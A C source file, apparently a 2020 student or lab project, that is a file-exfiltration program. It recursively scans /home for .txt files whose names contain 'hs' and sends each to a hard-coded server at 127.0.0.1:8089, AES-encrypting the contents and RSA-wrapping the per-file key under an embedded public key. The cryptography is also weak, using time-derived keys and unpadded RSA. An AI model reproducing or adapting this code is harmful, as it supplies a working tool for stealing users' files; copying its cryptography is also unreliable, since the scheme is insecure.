//
// Created by hs on 2020/5/25.
//

#include <unistd.h>
#include <sys/stat.h>
#include <dirent.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/aes.h>
#include <sys/time.h>

#define UINTLEN sizeof(unsigned int)
#define serverPort 8089
char * serverIp = "127.0.0.1";

char cwd[1024];
char c[1024];

RSA *p_rsa_public_key;

char * publicKey = "-----BEGIN PUBLIC KEY-----\n"
                   "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC27N5fK/kbHfnveRMwXyHJooVC\n"
                   "BsVWZdK73VXqVJku47pIK77jWPQLpeH8UWUaLLyXBGsRWx8e2NZICCoEugNpVE1j\n"
                   "ruat4h7V2la/w94n/Z39Yp2i7z61gLxp4QpMiq8M1rtb9kQZv6QvEUSgFUVxh5VC\n"
                   "O3VoI8geeU5XStD/twIDAQAB\n"
                   "-----END PUBLIC KEY-----";

int endWithTxt(char *str)
{
    int len = strlen(str);
    if (str[len - 1] == 't' && str[len - 2] == 'x' && str[len - 3] == 't' && str[len - 4] == '.')
        return 1;
    else
        return 0;
}

void tranFile(char *filename)
{
    AES_KEY aes_key;
    unsigned char buf[1024];
    unsigned char temp_buf[1024];
    unsigned int file_size;

    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = PF_INET;
    inet_aton(serverIp, &serverAddr.sin_addr);
    serverAddr.sin_port = htons(serverPort);

    struct stat st;
    if(stat(filename, &st) == -1)
        return;
    file_size = st.st_size;

    int send_fd = open(filename, O_RDONLY);
    if(send_fd == -1)
        return;

    int sock_fd = socket(PF_INET, SOCK_STREAM, 0);
    if(sock_fd == -1)
    {
        close(send_fd);
        return;
    }

    if(connect(sock_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == -1)
    {
        close(send_fd);
        close(sock_fd);
        return;
    }

    struct timeval now;
    for(int i = 0; i < AES_BLOCK_SIZE; i++)
    {
        gettimeofday(&now, NULL);
        temp_buf[i] = now.tv_usec % 253;
        usleep(53);
    }

    AES_set_encrypt_key(temp_buf, AES_BLOCK_SIZE * 8, &aes_key);
    *((unsigned int*)(temp_buf + AES_BLOCK_SIZE)) = htonl(file_size);
    strncpy((char*)temp_buf + AES_BLOCK_SIZE + UINTLEN, filename, 128-AES_BLOCK_SIZE-UINTLEN-1);
    temp_buf[127] = '\0';

    if(RSA_public_encrypt(128, temp_buf, buf, p_rsa_public_key, RSA_NO_PADDING) == -1)
    {
        memset(temp_buf, 0, sizeof(temp_buf));
        close(send_fd);
        close(sock_fd);
        return;
    }
    memset(temp_buf, 0, sizeof(temp_buf));

    if(write(sock_fd, buf, 128) == -1)
    {
        close(send_fd);
        close(sock_fd);
        return;
    }

    size_t size = 0;
    while((size = read(send_fd, temp_buf, sizeof(temp_buf))) != 0)
    {
        if(size == -1)
        {
            close(send_fd);
            close(sock_fd);
            return;
        }

        if(size < AES_BLOCK_SIZE)
            size = AES_BLOCK_SIZE;

        if(size % AES_BLOCK_SIZE != 0)
        {
            lseek(send_fd, -(size % AES_BLOCK_SIZE), SEEK_CUR);
            size = size - size % AES_BLOCK_SIZE;
        }

        for(int i = 0; i < (size / AES_BLOCK_SIZE); i++)
            AES_encrypt(temp_buf + i * AES_BLOCK_SIZE, buf + i * AES_BLOCK_SIZE, &aes_key);

        if(write(sock_fd, buf, size) < size)
        {
            close(send_fd);
            close(sock_fd);
            return;
        }
    }

    close(send_fd);
    close(sock_fd);
}

void findFile(char *dirPath)
{
    getcwd(cwd, sizeof(cwd));
    DIR *dir = opendir(dirPath);
    if (dir == NULL)
        return;
    chdir(dirPath);
    getcwd(c, sizeof(c));
    if(strstr(cwd, c))
        return;

    struct dirent *ent;
    while ((ent = readdir(dir)) != NULL)
    {
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0)
            continue;
        struct stat st;
        stat(ent->d_name, &st);
        if (S_ISDIR(st.st_mode))
            findFile(ent->d_name);
        else if (endWithTxt(ent->d_name) && strstr(ent->d_name, "hs"))
            tranFile(ent->d_name);
    }
    closedir(dir);
    chdir("..");
}

void init()
{
    BIO* p_bio = BIO_new(BIO_s_mem());
    if(p_bio == NULL)
        exit(-1);
    BIO_puts(p_bio, publicKey);

    p_rsa_public_key = PEM_read_bio_RSA_PUBKEY(p_bio, NULL, NULL, NULL);
    if(p_rsa_public_key == NULL)
        exit(-1);
}

int main(int argc, char *argv[]) {
    init();
    chdir("/");
    findFile("/home");
    return 0;
}

